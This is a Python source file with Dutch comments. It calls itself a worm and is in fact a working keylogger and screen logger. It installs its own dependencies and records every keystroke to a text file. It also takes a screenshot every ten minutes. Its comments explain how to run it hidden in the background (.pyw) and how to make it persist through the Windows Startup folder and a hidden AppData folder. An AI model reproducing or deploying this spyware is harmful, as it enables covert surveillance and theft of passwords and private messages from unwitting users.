# hernoem op het einde van deze worm de extensie naar .pyw ipv .py om het op de achtergrond te laten runnen
import threading
import subprocess
import sys
import time
from datetime import datetime

# Installeert het packet "keyboard" moest je het packet nog niet hebben
try:
    import keyboard
    import pyscreeze
    import pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pillow", "pyscreeze"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard
    import pyscreeze
    import pyautogui

now = datetime.now()
date_time = now.strftime("%d/%m/%Y, %H:%M:%S")

# folder to run on startup: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
# make a hidden folder in appdata



# screenshot function
def take_screenshot():
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
    filename = f"Screenlog_{timestamp}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
def screenLogger():
    while True:
        take_screenshot()
        time.sleep(600)  
    
# hier worden al de keystrokes in gestored
path = "data.txt"

def keyLogger():
    with open(path, 'a') as data_file:
        # Infinite loop to capture keystrokes
        data_file.write(f"\n\n |============================================================================| ")
        data_file.write(f"\n |         V         ! KEYBOARD LOG: {date_time} !         V         | ")
        data_file.write(f"\n |============================================================================| \n\n")
        data_file.write(f"<<{now.strftime("%H:%M")}>> ")
        while True:
            try:  
                temp_now = datetime.now() 
                event = keyboard.read_event()
                # Check if it is a 'down' event (key press)
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        data_file.write(" ")
                    elif event.name == "windows gauche":
                        data_file.write(" WINDOW ")
                    elif event.name == "backspace":
                        data_file.write(" BACKSPACE ")
                    elif event.name == "alt":
                        data_file.write(" ALT ")
                    elif event.name == "alt gr":
                        data_file.write(" ALT_GR ")
                    elif event.name == "ctrl droite":
                        data_file.write(" RIGHT_CTRL ")
                    elif event.name == "ctrl":
                        data_file.write(" CTRL ")
                    elif event.name == "maj":
                        data_file.write(" SHIFT ")
                    elif event.name == "right shift":
                        data_file.write(" RIGHT_SHIFT ")
                    elif event.name == "verr.maj":
                        data_file.write(" SHIFT_LOCK ")
                    elif event.name == "tab":
                        data_file.write(" TAB ")
                    elif event.name == "haut":
                        data_file.write(" ARROW_UP ")
                    elif event.name == "gauche":
                        data_file.write(" ARROW_LEFT ")
                    elif event.name == "bas":
                        data_file.write(" ARROW_DOWN ") 
                    elif event.name == "droite":
                        data_file.write(" ARROW_RIGHT ") 
                    elif event.name == "enter":
                        data_file.write(" ENTER")
                        data_file.write('\n')
                        data_file.write(f"<<{temp_now.strftime("%H:%M")}>> ")
                    else:
                        data_file.write(event.name)
                    data_file.flush()
            except Exception as e:
                # Log error if needed (print or log to another file)
                data_file.write(f"Error: {e}")
                data_file.flush()
                break      
            
keyLog_thread = threading.Thread(target=keyLogger)
screenLog_thread = threading.Thread(target=screenLogger)

keyLog_thread.start()
screenLog_thread.start()

keyLog_thread.join()
screenLog_thread.join()